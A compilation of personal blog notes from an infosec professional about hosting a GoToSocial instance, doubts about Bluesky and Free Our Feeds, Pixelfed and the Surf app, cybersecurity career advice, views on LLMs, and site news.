Memory, CPU and PostgreSQL Disk Space. The starting price for a GoToSocial instance with K&amp;T Host is only $3. 75 USD/month. Incredible value if you ask me for what you get. Scaling up if you want/need seems pretty reasonable too from a cost perspective. I didn‚Äôt choose any upgrades, but I probably will need to if I end up moving my primary Fedi presence to GoToSocial in the future. Set those configs as you want, give them the domain name you want to have your instance hosted at, and they get goin‚Äô setting it up! For me, I think they got it all set up within like 30 minutes of me submitting the order. They‚Äôll send you an email explaining how to set up the A records for your domain, you add those records and then send them a ticket and within literally minutes, GoToSocial will be installed and ready to use. You can SSH directly into your GoToSocial server (they will email you credentials), manage user accounts, and get right to any customizations you‚Äôd like to do. If you run into any issues, or need help in any way, check out their great GoToSocial support documentation, or just create a support ticket! Some other factoids about the default GoToSocial installation with K&amp;T Host‚Ä¶ Snapshots are enabled and will run once a day. Seven snapshots are kept. Snapshosts can be found in /snapshots over SSH. Database backups happen once a day. Seven days worth are kept. Database backups can be found in /autobackup over SSH. K&amp;T Host does not provide object storage (e. g. S3) services directly. But any external S3 provider can be configured and used. GoToSocial media is stored in the /apps/gotosocial-storage directory. K&amp;T Host uses distributed storage powered by MooseFS (https://github. com/moosefs/moosefs). All customer data is stored that way, and accessed by the compute nodes over the network. The same applies when logging in over SSH. Data is triple-replicated for safety and redundancy. K&amp;T Host prices disk space at $1/m per 200GB or $5/m per TB of storage. Space can be scaled up to 10TB per service by default. Note: K&amp;T Host will instruct you to set up SMTP on your shiny new instance, but you don‚Äôt really need to for single-user instances. You manage your user (create a new user, promote it to Admin, delete the default administrator user) all through the command line. A useful support doc for these operations are here. CustomizationsFor anything else you want to do with your GoToSocial instance, the official GoToSocial Documentation should be your go-to place. For example, I really wanted to increase my post character count, so I found this setting. A quick change to statuses-max-chars, a restart (touch /system/action/gotosocial. restart) and boom! I was in business. I also found this, A complete guide for your GoToSocial server, which has a lot of useful advice for hardening your GoToSocial instance. I really haven‚Äôt had much opportunity to really dig into more advanced or fun customizations, but as I do, I will try to update this doc/section. That‚Äôs it!Not much more to say! It‚Äôs early days for trialing GoToSocial but I am enjoying it so far. There‚Äôs really two big things that need to clear before I make it my main fedi presence/software. I need my favorite Fedi client, Ivory to add support for GoToSocial. They say it is coming in the next release! I need to migrate some follows and followers to see how well the instance handles the increased activity. I suspect I will need to scale a few things, but I feel pretty sure that when it‚Äôs all said and done, it will still be cheaper than the 19/mo I currently pay for my Mastodon instance with masto. host.

Okay, that‚Äôs fair I think. I have no objection to this on its face. The ‚ÄúFediverse‚Äù has been around for a while and though it has never been more popular than it is now, it has struggled to really gain mainstream appeal. (Perhaps that will change more drastically this year as fedi platforms like Pixelfed gain more attention though). So though he (Cory) admits that Mastodon/Fediverse is ideal, would be perfect for what they‚Äôre (‚ÄúFree our Feeds‚Äù) trying to do, it‚Äôs just not the clearest solution because the difficulty of getting people to adopt it en-masse seems somewhat insurmountable at this time. Fine. He goes on to say that the answer is, as he puts it, ‚Äúinstalling our own fire-exits in Bluesky‚Äù, or in other words, standing up a second Bluesky relay/infrastructure that ‚Äúfederates‚Äù or otherwise interoperates with the main Bluesky infrastructure - similar to how distinct Fediverse instances can communicate with each other. This too makes sense. If the main Bluesky enshittifies, or goes down, or is subject to hostile/billionaire takeover, than people have the choice to switch over to the other relay, the ‚Äúgood‚Äù one. Now here is where his argument starts to fall apart‚Ä¶ First, ‚ÄúFree Our Feeds‚Äù is asking for 30 million dollars to do this. Wow. That‚Äôs a lot, and doesn‚Äôt speak well to how easy it is to stand up and maintain a second instance of the entire Bluesky infra. Second, the Free Our Feeds website speaks nothing of how they will keep that infra alive, i. e. pay for ongoing operating costs. Even the main Bluesky company doesn‚Äôt have a realistic monetization strategy, they are kept alive by VC money alone pretty much. Finally, what Cory fails to address, and in my mind, the biggest issue with his whole argument is that having just ONE single other relay/instance of Bsky as a whole is not the robust ‚Äúfire exit‚Äù he thinks it is. Let‚Äôs say Free Our Feeds succeeds and they stand up a fully interoperable, yet fully isolated instance of Bluesky, and they manage to get a sizable portion of the existing Bluesky userbase to move over there. Like, 5 million of Blueskys ~30 mil or w/e. Let‚Äôs say then that Bluesky sells out to Elon Musk or Bezos or whomever. This triggers another mass migration of 5 million, or 10 million or even everyone over to the Free Our Feeds relay. (Though we all know that they‚Äôd be lucky to get half of regular people to figure out how to ‚ÄúSwitch‚Äù relay providers). Now they are RIGHT BACK to where they were to begin with. A single provider, just as vulnerable to hostile takeover or enshittification as the original Bluesky was. So you might say, okay? well then stand up ANOTHER relay. Crowdfund another 30 million. Right? ‚Ä¶ What?!? Bags of 30 million dollars don‚Äôt just grow on trees ya know? It‚Äôs hard enough to get people to pay for these types of services, and I just don‚Äôt think having one, or two or even 5 other relays is enough redundancy, enough resiliency to combat the billionaires and the governments of the world that want to control what we see, what we talk about, and who‚Äôs allowed to speak. That‚Äôs why the Fediverse works. It‚Äôs made up of literally thousands of servers, of all different sizes, some Mastodon, some GoToSocial, some Lemmy, some I mean w/e. Theres tons of different platforms that all interoperate, and they don‚Äôt cost 30 million to run. I‚Äôm typing this out on a GoToSocial instance that literally costs $3. 75/mo. You heard that right. Less than $4/mo. To put that in perspective, I could run 8 million GoToSocial instances at this price if I was given 30 million dollars. I‚Äôd like to see Musk try to buy all those out üòÑ. I‚Äôll try to put it another way here. I‚Äôm in cybersecurity, and one thing we‚Äôre taught is that attackers, with enough time and resources can literally get into anything. So our jobs as defenders, on top of all the usual stuff (e. g. defense in depth, blah blah), is to just slow them down. Make it impractical (from a time-spent perspective) to achieve a reasonable return on (time) investment. It wouldn‚Äôt be hard for a billionaire or a hostile government to take down one, two, three or maybe even 10 Bluesky relays. But it seems wholly impractical for a billionaire, or a team of billionaires to snuff out thousands of Fediverse instances. And hell, these are just instances that exist now, in a very fledgling model where Fedi only has like a couple million MAU. Imagine a timeline where Fediverse got REAL world-wide adoption, and we went from a few thousand instances, to hundreds of thousands, or millions of instances. Taking that down would be like taking down the Internet itself, and if that could happen, we might have bigger issues. Oh and I forgot to mention, that FreeOurFeeds can‚Äôt even stand up another relay. Bsky devs have already stated that‚Äôs impossible at the moment. Though theoretically this will be addressed in time‚Ä¶ Alrighty, let‚Äôs wrap this up. I get it. Bluesky is hot. It‚Äôs popular. It‚Äôs got steam. It‚Äôs got gobs of cursed VC money. It‚Äôs got some admittedly cool tech behind it. But it just isn‚Äôt it. Not unless it can find a way to solve for the whole it‚Äôs-insanely-expensive-to-run-another-relay issue. If Free Our Feeds succeeds, stands up another instance and figures out a way to run it on the cheap, then I‚Äôll be the first to say ‚Äúcongrats‚Äù and ‚ÄúI was wrong‚Äù. Until then, I will remain skeptical, and I‚Äôll keep saying that this sort of money would be better thrown at building out the proven solution, the Fediverse. More on this: Free Our Feeds?

As far as I know, you can, through ActivityPub, move followers from one ‚Äòinstance‚Äô to another, but I don‚Äôt know if you can ‚Äòclone‚Äô them, i. e. have everyone you follow on Account A magically follow Account B without initiating that move directive. So it‚Äôs not like you could port your social graph in that way. Second option would be that Pixelfed is just a pic-forward UI on top of an existing fedi account. But would that necessitate instance admins bear the responsibility of image hosting? I imagine Pixelfed servers are purpose-built to handle image storage, delivery, processing, etc‚Ä¶ Instance admins already have a hard enough time funding their instances, the last thing they need is sky-rocketing image hosting (object storage) costs Some sort of SSO option? Sure, ‚ÄúLogin with Mastodon‚Äù could be a thing, but there would still need to be an account on the backend for Pixelfed yeah? For me, and I know I can‚Äôt be the only one, though maybe I‚Äôm in a minority - the group of folks I would want following me, and who would want to follow me on my micro-blogging account, are NOT the same group that would be interested in the photos I want to share. Same in reverse. I follow a lot of people here, my more professional-leaning account specifically, that I wouldn‚Äôt really care to see their photos (sorry! no offense!). What would my options be then? Not follow them because now their Pixelfed posts are from the same account as their microblog posts? For many, (though I know not all) photo sharing is more personal, and thus limited to a smaller subset of people (i. e. IRL friends, family, niche groups, etc‚Ä¶), whereas microblogs (commonly just shit posts) are perfectly fine for the wider public. I‚Äôve seen plenty of people gripe that they have to create multiple accounts across Fedi services. But I think that‚Äôs better given how identity works here. Imagine you had accounts across Lemmy, Pixelfed, Mastodon, Bookworm and Loops - all tied to your Mastodon instance. Then, that instance goes down, for any one of the reasons that instances tend to die. Then what? Sounds messy. I think the problem is more that instance-tied identity needs to be fixed rather than expecting platforms like Pixelfed to rely on other Fedi services to do this (Looking at you ActivityPub folks). To those folks who have existing social graphs/networks and would like those folks to follow them on Pixelfed, I encourage you to just boost yourself. Yep! Follow your Pixelfed account from your ‚Äúmain‚Äù Fedi account and when you post something on Pixelfed, it will show up in your (for example) Masto feed, and you can boost it to your network. Anyone who‚Äôs interested in that content from you, can choose to follow ya. I think that‚Äôs also very much in line with the ‚Äòopt in‚Äô culture of the Fediverse. Especially considering how touchy folks can be here about stuff in their feeds, especially images, I think this is the smart move üëç. But like with all things, it would be cool to see a centralized Fedi identity thingy take shape eventually and this be at least an option for those who want to use these various services all under a single persona. I‚Äôve seen people talk about (at minimum) a way to ‚Äòlink‚Äô or otherwise associate accounts. For example if you follow my ‚Äòmain‚Äô Fedi account, it would also present my associated (child?) accounts - those could be Pixelfed, Lemmy, Masto alts, w/e!

(There‚Äôs some obvious technical reasons for why this is the case that I‚Äôm not going to explain here. ) This is why having your own website is so important and can be so valuable! If there‚Äôs something you‚Äôve posted on social media (or wherever on the web) that‚Äôs worth saving, then why not make a copy of it and have it published on a web site? Your website! I like to refer to this as ‚ÄúReverse Syndication‚Äù, but for those of you that speak indieweb, you‚Äôve probably heard of PESOS (‚ÄúPublish Elsewhere, Syndicate Own Site‚Äù). Basically it means that what you publish FIRST on social media, you make a copy of on your site. This could be as an archive, a canonical representation, a data ownership/soverignty play, w/e! I‚Äôve used a ton of social media sites, sites like Reddit, and switched Fedi instances multiple times. Across these years (at least since I‚Äôve been bathed in the glorious light of the Indieweb), I‚Äôve been PESOS-ing things I think I want to hold on to to my site. The vast majority of these things I file away as ‚Äúnotes‚Äù (in my ‚ÄúNotebook‚Äù).

This I think is true, in terms of the Fediverse‚Äôs resiliency to the power of just money being thrown, but vulnerability remains. Specifically, I am concerned about recent government regulation that has already proven to be effective in closing down Fediverse instances and deterring others from even spinning up an instance. I‚Äôm no legal professional, so excuse me if I say anything that is wrong or doesn‚Äôt make sense. Anecdotally, I‚Äôve seen a bunch of posts across the Fediverse about how they are closing down an instance thanks to the UK‚Äôs Online Safety Act (2023). Similarly, it seems like the US bill (KOSA) could have similar effects? From what I understand, there is some new liability if your server hosts certain content and given how many Fediverse servers operate, caching content locally from other servers, there introduces a vulnerability by which a malicious actor could spam the Fediverse with something ‚Äúbad‚Äù/illegal which would then be stored/cached across a large swath of the Fediverse which could expose these instance admins to legal liability. Not good.

I would describe Surf as, an app for the Social Web that let‚Äôs you build and share custom feeds. So what does this mean in practice? The Surf about page is a little light on detail, but has gobs of style. When I first downloaded the app and got into the Beta, I admit I wasn‚Äôt sure what the app would do for me that my already-well-curated Fediverse timelines wasn‚Äôt doing. But then, I built my first custom feed. From there, I started to see the potential‚Ä¶ Surfing ShellsharksTo test out Surf, I first tried creating a simple feed pulling all of my Shellsharks-related things from across the ‚ÄúSocial Web‚Äù together. I was able to add Sources for my RSS feeds, my Podcast, my Bluesky profile, my Threads profile, my various Fediverse accounts and even posts that were ‚Äúabout‚Äù or matched the term ‚Äúshellsharks‚Äù. Interesting! It‚Äôs easy enough to create a ‚Äúlist‚Äù in a given Fediverse client that can capture most of these things (e. g. my Fedi accounts, Bsky, Threads, RSS feeds, etc‚Ä¶) but not all of them. Pulling in posts that match certain search criteria is an added layer of discovery for me. It also treats Bluesky and Threads and other non-Fedi-native content as first-party content within the Surf app itself, bundled in a pleasing, swipable, card-style view, allowing me to flick through posts that match my source material. OK, well that looks cool, and I‚Äôll definitely go to it to check in on myself, but what else can I [do with Surf](#benefits-of-a-social-web-browser-and-feed-builder? Benefits of a Social Web Browser and Feed Builder: So what can Surf do beyond building eye-pleasing lists of Fediverse accounts and hashtags? Let‚Äôs talk about it. The first obvious answer is sharing. There‚Äôs no easy way to create and then share lists of Fediverse accounts. We saw this when Bluesky unveiled their ‚ÄúStarter Packs‚Äù and the Fediverse tried to mimic it, and it‚Äôs true to this day. The Fediverse‚Äôs non-algorithmic way of life means we rely mainly on self-curating and network-related-boosting. Without robust list sharing features, we‚Äôve never really had an easy way to share our curated lists, but Surf tries to make this easier. I have several custom feeds now that you can add (if and when you get the Surf app). Since you log in to Surf with your Fedi account, you can also interact with and follow things directly from the app! Another thing I like about the Surf model is the ability to follow feeds or accounts in a more, casual manner. Everything I follow in my regular Fediverse timeline is something I want to see. I want to read what my follows post and potentially interact with those things. I am a timeline completionist in this way. But there are times I want to casually scroll, to be entertained, or informed or to discover new things I want to follow. Custom feeds via Surf give me the ability to peruse things in a non-commital way. For example, to do something similar in Mastodon, I would need to A. follow an account/hashtag, B. add that account/tag to a list, and then optionally C. decide whether I want to remove what‚Äôs in that list from my timeline. This forces me to follow things I might be interested in looking at from time to time, but not actually following, and it forces me to make a decision on how to bisect my main timeline, which is not something I want to do. In short, I don‚Äôt like Mastodon lists, but I like what I can do with Surf. Let‚Äôs talk about content diversity. Within the Fediverse, I can curate a list or feed of a lot of things. Micro-blogs, pictures, videos, podcasts, forum posts, and more. The beauty of the Fediverse is in it‚Äôs diversity. But the Fediverse, as large as it is, is still only a subset of an even wider ‚ÄúSocial Web‚Äù. What Surf let‚Äôs me do, that you can‚Äôt exactly do within a traditional Fediverse client, is build a feed that has even more types of things - generic keyword searches, YouTube videos, podcasts, native (not-bridged) Bluesky profiles, and I suspect more in the future. The final benefit (at least that I‚Äôve discovered thus far), is the opportunity for improved search. At the bottom of the Surf app is a text box that says ‚ÄúSurf the social web‚Äù, and it seems to bring back a lot of good results! Far better than what I can get on my single-user instance, and I suspect better than most people can get even on larger, mid-sized instances. I don‚Äôt know a lot about how this search works under the hood, but it‚Äôs already an improvement over what I have. This is just a beta, so there‚Äôs lots of room to iron kinks out and add even more types of content, and ways to further tailor feeds.

They might, if the FoF thing works out. ) Mike also makes a lot of assumptions around people hosting their own PDS‚Äôs (something a very small fraction of people will actually do) and about their willingness to switch Bluesky providers, or ‚Äútake the fire exit‚Äù (to use Doctorow‚Äôs terminology). Let‚Äôs poke-a the holes, yeah? Alright, ATProto looks open enough, the docs are right here!. Again, I‚Äôm no expert, and have spent no time standing up any aspect of the Bluesky network or implementing ATproto in any way, but the docs seem comprehensive and theres write-ups out there of people standing up just about all of the infra required to replicate Bluesky, at least in some limited fashion. As of 11/24, there was this ONE holdout (based on this blog) where it seemed like you couldn‚Äôt yet really self-host your own AppView. Maybe this has been resolved by now? But let‚Äôs assume you CAN stand up every bit of Bluesky (if you have the money - we‚Äôll cover that later), does this mean someone will? I mean ‚ÄúFree Our Feeds‚Äù is going to try to, but that‚Äôs just one other person. There‚Äôs close to 30 million users, so there‚Äôs definitely non-trivial interest in Bluesky and maybe in the underlying protocol, but how can we be so sure that if the main Bluesky were to go down, that anyone would care enough to keep standing up more instances of it? Sure it‚Äôs open, but do people care enough? You can point to FoF as proof that someone cares enough to do it, but you need more than just one replica of Bluesky to be billionaire-resistant. Also, I‚Äôll remind you that FoF is experimental. No one has actually done what they are trying to do. Sure parts of the network have been replicated, but to build a full-on, interconnected bsky clone and get people to move over to it? Unproven. Free Our Feeds. I‚Äôve covered the FoF thing extensively here. Basically, building a Bluesky clone for 4 million dollars, or 30 million dollars or w/e proves nothing to me. That alone is not enough to outmaneuver a hungry billionaire. If Musk can buy Twitter for 44 Billion, he can absolutely snatch up like 10 Bluesky instances without breaking a sweat. On enshittification. I think some level of enshittification is inevitable for Bluesky. Which isn‚Äôt to say it will make the service unusable, or that it will become ‚Äúbad‚Äù because of it. The simple fact is that Bluesky needs to monetize. They have to because they took VC money. right? This seems like a simple truth, but happy to be explained why that isn‚Äôt the case. So yeah, how will they monetize? They don‚Äôt want to paywall the entire service, that will kill the open-ness and definitely cause them to lose active users. SO they need to paywall power-user stuff? Ok, that‚Äôs not going to get VC-level returns. What else? Sell domain names? Yeah, not going to cut it either. I dont know what they‚Äôre going to do. Mike has said, (and he has inside knowledge) that they are working on some ideas. I hope he‚Äôs right. But if the end result is paywalling actual useful features, or doing ads, or selling peoples data, then the service is enshittifying. Which again, doesn‚Äôt mean it‚Äôs bad, and doesn‚Äôt mean that it will become something most people don‚Äôt wanna use. Only that compromises had to be made, so that the VCs could see their returns. Think about it though, if there was some magical way to monetize and make MILLIONS, without doing ads (or similar), wouldn‚Äôt someone have done it? He says, they won‚Äôt enshittify, because there are competing services people will run to. Like where? To FoF? They don‚Äôt even exist yet, and even if they did, they are also battling the enshittification demons. The Fediverse? Lol. If people wanted to go there, they‚Äôd be there. Back to X? Threads? C‚Äômon. Sure, these other networks might prevent them from going FULL-ON enshittifiy mode, but it‚Äôs just a game of, can we make our platform just a LITTLE LESS awful than any other. Let me get to the real reason why none of this matters. The costs of moving. People DO. NOT. WANT. TO. MOVE. They just don‚Äôt. If Bluesky enshittifies, a lot of people just won‚Äôt go. I mean look at X. So many have stayed because it‚Äôs just too much of a hassle to sign up for ANOTHER thing, and rebuild. Now before you say, ‚Äúbut AT is open protocol! I can move my followers, I can host my own PDS! blah blah‚Äù. Stop. Most people aren‚Äôt going to host their own PDS. So they‚Äôre not migrating their posts elsewhere. More importantly, let‚Äôs talk about followers. People don‚Äôt want to lose their communities, their followers, their friends. I don‚Äôt know exactly how ATproto handles moving followers, but the idea is that it can be done. So if Bsky main goes to shit, FoF is now there, people can just sign up there, move their followers over. Great right? Problem solved? No. For one, not everyone‚Äôs going to do that. Remember, people HATE moving. Ok, so now you have another fracturing event. Half of your friends are on Bsky main, and you and the other half of your friends have moved to FoF Bsky. No problem right? ATproto is meant to communicate between instances. Sure‚Ä¶ but this ASSUMES that the main Bsky is being a good citizen and allowing this communication right? Maybe for those who have opted to host their own PDS‚Äôs you can have the FoF relay scoop your posts, but for everyone on the main Bsky PDS (which again, is most people), you might not be so lucky. You see, we on the Fediverse know these things. People get confused when there is more than one instance, people get confused when Mastodon instance 1 can communicate with Mastodon instance 2, but they have different names, different cultures, different features. They just don‚Äôt grok it. But the larger network of ATproto-enabled bsky instances have to contend with instances being adversarial. How will they do this? In the Fedi world, you just defederate and move on. But in a world where there‚Äôs only two bsky instances (or three or 4 or whatever), each hosting an equal portion of the entire network, you can‚Äôt do this without handicapping the entire network. So in a scenario where a billionaire takes over Bsky main, shuts off communication with the second Bsky instance, and becomes adversarial (not allowing follower moves? not sure if that‚Äôs possible), keeps people from getting their content, etc‚Ä¶ then what? There‚Äôs just not enough resiliency in the model. Finally, I want to touch on some of his closing thoughts. He makes a lot of statements about how FoF is ‚Äúproof‚Äù that this is possible, and that when successful it will ‚Äúbring us back towards the original promise of the open web where users are in control, rather than giant companies‚Äù, neither of which makes sense to me. For one, FoF hasn‚Äôt proved anything. They want to raise 4 million to start and haven‚Äôt even hit 100k. They haven‚Äôt proven it will work, they haven‚Äôt even proven that people care about decentralization enough to fund a second instance (spoiler, people don‚Äôt care about decentralization, if they did they‚Äôd go where its already been proven). Second, he says bluesky, or ATproto puts the users in control, not companies. Does it though? Users don‚Äôt run these platforms. They can‚Äôt afford to. FoF needs 4-30 million to do it, and again, they haven‚Äôt yet. With Bluesky, we are not in control. Maybe, just maybe you can make a convincing argument that it can be billionaire-resistant, but it sure isn‚Äôt something that then people own. It takes big money to run these instances, and the people don‚Äôt have big money. Corporate interests do. That‚Äôs why Bluesky needs VC. The Fediverse on the other hand doesn‚Äôt. It‚Äôs for the people, by the people, funded by the people. It‚Äôs a proven solution. I want to end this by saying that I don‚Äôt want to see Bluesky fail. I want to see the protocol evolve. I want to see it compete with ActivityPub, each pushing each other forward. I want to see FoF succeed and for another real decentralized player to come into form. I want things to be billionaire proof. I just don‚Äôt think this is it.

Let‚Äôs look at the fundraising efforts for Pixelfed and Free Our Feeds‚Ä¶ Pixelfed: They wanted to raise ~35k, blew through this very reasonable goal in less than a day, and have no raised nearly ~60k. This is an effort to continue improving what is already an existing platform with 100s of thousands of active users.

I answered this kinda rapid-fire on Reddit, but decided to come back here in the note and give it a bit more thought and embellishment‚Ä¶ Work-Life-Balance: Maybe I‚Äôm lucky here, but I‚Äôve always felt my WLB was pretty great. Mostly I think WLB is something you have to learn to manage yourself, otherwise you can be eaten alive. Sure, I get busy sometimes, but usually I see this as ‚Äúgood stress‚Äù, not something that is overwhelming. Hours: I work 8 hour days at most. Anything I work over that is for no other reason than I‚Äôm a nerd and I‚Äôm literally doin‚Äô work-related/adjacent stuff in my free time because I genuinely want to. Look no further than this blog. Sometimes I write about infosec stuff, and sometimes that infosec stuff just happens to be what I‚Äôm actively doin‚Äô at work at that time. A nice symbiosis if you ask me! Companies: Most companies I‚Äôve worked for (imo) don‚Äôt really care about infosec. There is regulation which compels them to do certain things, and there is the very real, ever-present threat landscape, but investment into infosec is always seems to be reactionary and bare-minimum-ish. Sure, there have been some exceptions, at least to some degree, but the fact is infosec is a cost center, and companies continue to see responding to potential breaches/incidents as being preferable to staffing up appropriately. As such, you‚Äôll probably always feel understaffed in your orgs, and that‚Äôs because you are. Difficulties: see ‚ÄúCompanies‚Äù above. Besides that, infosec is hard. Even when it shouldn‚Äôt be. The basics really aren‚Äôt that hard, but you wouldn‚Äôt know that given how often even ‚Äúpros‚Äù seem to get the basics wrong. I swear burnout happens mostly because it seems people just continuously seem to fail on the easiest stuff and it gets a little frustrating‚Ä¶ One more thing, there‚Äôs a lot to learn. Which is awesome really, but if you don‚Äôt have time to learn, then you can feel constantly behind. Too many companies don‚Äôt make time for folks to skill up, and that‚Äôs an issue. Getting hired: Yes it was difficult (for me), and that seems to still be the case for a lot of folks. Traditionally, it‚Äôs been hard to break in, and then easy to move up and around after that. That said, seems like the market is tightening more and more these days to the point where even experienced folks are having more trouble staying gainfully employed‚Ä¶ Getting necessary qualifications: Though a career in cybersecurity might not be as dependent on certs as it once was, you still universally see them as requirements or ‚Äúnice-to-haves‚Äù on job reqs. I don‚Äôt think you need to pile up certs, but having one or two that are applicable to the job roles you are applying to can help you get past resume screens. So don‚Äôt focus on ‚Äúcertification paths‚Äù, instead focus on learning actual skills. I have a bunch of thoughts on what cert you should take here. It‚Äôs also worth pointing out that you don‚Äôt need to spend thousands to get the necessary skills. You‚Äôll also have to factor in the amount of time it takes to study and actually take these exams. Pay: Pay has been good. You can make good money and there‚Äôs decent opportunities. From a money perspective, I‚Äôm not sure what I‚Äôd really do in my life it wasn‚Äôt for tech, and more specifically, infosec. I know plenty of folks outside the industry and their prospects are just not as good, and most of them have worse hours, less perks, more stressful jobs, etc‚Ä¶ GOOD LUCK!

Many laud its uses, others frame it as ‚Äúuseless‚Äù. The truth is never black and white. AI (and LLMs) are still very much a nascent technology, at least as I see it in the grand scheme of things to come. But, given the proliferation of this technology throughout the tech world, permeating much of our regular daily lives, you‚Äôd assume it was much more mature and robust. Below, I try to point out some of the many concerns that I have observed, in order to juxtapose those against the reality that AI/LLMs do in fact have real-world uses, and when employed correctly, can admittedly be powerful tools. You can write something on this subject‚Ä¶ but I‚Äôd scope it a bit differently, because their‚Äôs a lot more at play here than just ‚Äúis it useful‚Äù vs ‚Äúis it not‚Äù. To make a fair, leveled case for why LLMs have value, I think it‚Äôs worth first acknowledging all the things that are off-putting about LLMs. To name a few‚Ä¶ (I‚Äôm going to use the terms ‚ÄúAI‚Äù and ‚ÄúLLMs‚Äù interchangeably throughout‚Ä¶) The seemingly devastating environmental impacts (and general resource consumption concerns) The whole ‚Äúwe had to rip off everyone‚Äôs writing, art, content, and general IP to make this work‚Äù aspect The plenty of use-cases where companies are trying to shove ‚ÄúAI‚Äù into things that just don‚Äôt make sense. (I saw someone post about an AI-enabled toilet‚Ä¶ what?) The uncomfortable reality that LLMs (or generally ‚ÄúAI‚Äù) have been employed in place of actual humans, leading to workforce reductions, blah blah. (I understand this is the nature of technology advancements to some degree, but there‚Äôs still a human cost here that can‚Äôt be discounted, and just saying ‚Äúgit gud‚Äù to folks who are impacted isn‚Äôt really the best argument) The embarassing AI fails - e. g. remember when Gemini told us to put glue on our pizza? The scenarios where AI is used in ways that are actually not that great for AI The general griftiness and undeserved grandiose claims from the tech-bro CEOs that keep promising ‚Äúhuge leaps‚Äù, and ‚ÄúAGI is just around the corner‚Äù, but still can‚Äôt do seemingly basic shit a normal human can do‚Ä¶Because look, I don‚Äôt think most people, if you were to ask them face-to-face and get an honest, tempered reply, would say that LLMs are literally ‚Äúuseless‚Äù. Instead, I think they would just point to any combination of the bullets above and try to make the argument that it‚Äôs just not worth the overall hype we‚Äôre seeing across the industry and the world at large. It‚Äôs just annoying. It‚Äôs jammed into every single product, and in these early stages of the tech, it‚Äôs had some really public face plants. Sure, it‚Äôs set to get better, tech has a way of doin‚Äô that, but you have to admit the souring effects these fails have. So when we (the AI doubting populace) see these constant stream of visible fails coupled with surging product costs (to offset maintaining AI systems), mass layoffs (again because companies think AI can replicate those functions), and reports about how catastrophic this all is for the environment, we get to the point where we make statements like‚Ä¶ it‚Äôs useless. So, maybe without even diving into all those things you could just phrase your post as something like‚Ä¶ ‚ÄúYeah AI (or LLMs, whatever) suck for so many reasons, but they‚Äôre not COMPLETELY useless.

Let‚Äôs talk about ‚Äòem‚Ä¶ Not asking questions. Never be afraid to ask questions. It doesn‚Äôt matter what anyone else thinks, and most of the time, they aren‚Äôt going to think what you are worried they might think about you asking a question. It‚Äôs an opportunity to learn something and each time you don‚Äôt ask the question, you miss out on that opportunity. Don‚Äôt let imposter syndrome get to you, don‚Äôt let some expectation of what you‚Äôre ‚Äúsupposed to know‚Äù stop you, don‚Äôt be shy. Just do it. Don‚Äôt discount the small things. There‚Äôs a lot you may learn (or be forced to learn) that you think is ‚Äúunimportant‚Äù or ‚Äúuninteresting‚Äù but in my experience, those things have a way of coming back and being of importance later. The amount of times I‚Äôve had to relearn things is absolutely infuriating. Take breaks, but don‚Äôt let off the gas. Look, you don‚Äôt want to be burned out, but you don‚Äôt want to lose your motivation, your drive, your momentum either. I wonder sometimes where I could be if I had remained focused and really kept my eye on certain goals. Build a portfolio. I have a portfolio / personal website (combined) that I‚Äôve been maintaining since 2019. I graduated college and joined the workforce full time in 2010-ish. In those 9 years I wish I had that same idea to document my journey, blog about what I‚Äôd learned and built a reference for myself over the course of my entire career. It would have been game changing I think. Focus on the journey, not the destination(s). Clich√© maybe, but the wisdom is there I think. I spent too much time trying to get to X job, or Y certification, or Z salary and less time focused on building a skillset brick by brick which would have given me the foundation required to really make it farther. Take risks, especially earlier in your career. I‚Äôm mostly satisfied with my early career moves. But I think I‚Äôve missed some opportunities. Hindsight is always 20/20 (as they say) but there are a few things I think I regret. Network. Yea, by this I mean traditional networking across your industry, but more specifically, I mean at your company. Spend the time to cultivate relationships - with your team, with your manager, with your skip, with other ‚Äúmovers-and-shakers‚Äù. Find ways to be impactful for them. I‚Äôve always been terrible at ‚Äúplaying the game‚Äù, so it‚Äôs a ‚Äúmistake‚Äù I own to some degree, but I advise others to try a slightly more determined approach. Being a generalist is fine, but go deep on SOMETHING, maybe a few things. I wish I had spent more time just diving super deep into one specific domain, rather than getting distracted by every little thing across my entire field. Sure, I‚Äôm a perfectly good generalist and have some specialties, but I‚Äôm not super specialized in anything specific I don‚Äôt think. I‚Äôm sure there‚Äôs more things, but I‚Äôm tapped out. Don‚Äôt make all these mistakes!

Infosec, even back when I was first getting into the field in 2010-ish, has always had that seemingly artificial barrier-to-entry, but there was A LOT that was different then and just doesn‚Äôt apply today. The technical/experience expectation(s) for newcomers has skyrocketed, the competition for jobs has ballooned by several orders of magnitude it seems, opportunities have stagnated to a degree, and the advent of AI has started to put pressure on these sorts of technical roles. When I was getting into the field the recommendation was basically, ‚Äúget a certification or two, starting with the Security+‚Äîand ideally, have a degree in computer science‚Äù. That was it. Nowadays the expectations are through the roof, and you‚Äôre competing with others who are building incredible resumes before even landing their first job.

Site News Created the Captain‚Äôs Log for micro-journaling. Earlier this year I refreshed the old design 1 (shown below) into what you see now. Though there was a number of under-the-hood changes, the biggest and primary reason for the redesign was that I wanted something that was dark mode. I‚Äôm often up late-at-night working on stuff and having a site that was mostly blinding white (as you can see in the image below) was just not working out for me. With this thematic change I also created the cool new Shellsharks icon you see on the front page. I love it! Shellsharks Community From it‚Äôs inception Shellsharks has been a community-building effort. I‚Äôve always enjoyed mentoring and sharing what I am learning/working-on and I‚Äôve been trying to find new ways give back. In its original form, Shellsharks was merely a meet-up group where me and a number of coworkers got together and did some CTF-type stuff. Since then I‚Äôve created the blog/site and most recently I‚Äôve established the Shellsharks Discord. It can be hard to write a blog and not feel like you are just shouting into the void. With community-building aspirations comes the challenge of building a following or put differently, cultivating engagement. Sure, I can pitch my content on Reddit or LinkedIn, or I can @ people on Twitter from the official @shellsharks account but I‚Äôve never really been the ‚Äúnetworking‚Äù type - the majority of my relationships having been made in face-to-face/on-the-job situations. But I‚Äôm here all the same, slowly reaching out across the web and into my professional contact-space and piecing together something bigger, not for myself but for the (hopeful) betterment of the infosec community. It‚Äôs worth pointing out that this foray is not into an untapped vacuum but rather a space that is quite crowded. There are a ton of infosec-themed Discord servers, cybersecurity blogs and infosec resources/training sites. This invariably complicates the process of building yet another unique infosec community but fortunately speaks to the overall (amazing) health of the community-at-large. In any case, I‚Äôd love for anyone interested in connecting to find me in the Shellsharks Discord or send me a message on Mastodon!Shellsharks Podcast In addition to other community-building endeavors (see above), I am working on spinning up a Podcast. This is still in relatively early stages. I‚Äôve acquired some of the gear (i. e. audio interface, mic, boom arm) and I‚Äôve been workshopping some names and potential formats but nothing is decided quite yet. I am waiting on my new computer to arrive before I really get going on it. The format will likely be pretty casual. I plan to have a variety of guests where we‚Äôll mostly just chat about anything infosec, tech or just life (as is the broad theme of Shellsharks). Stay 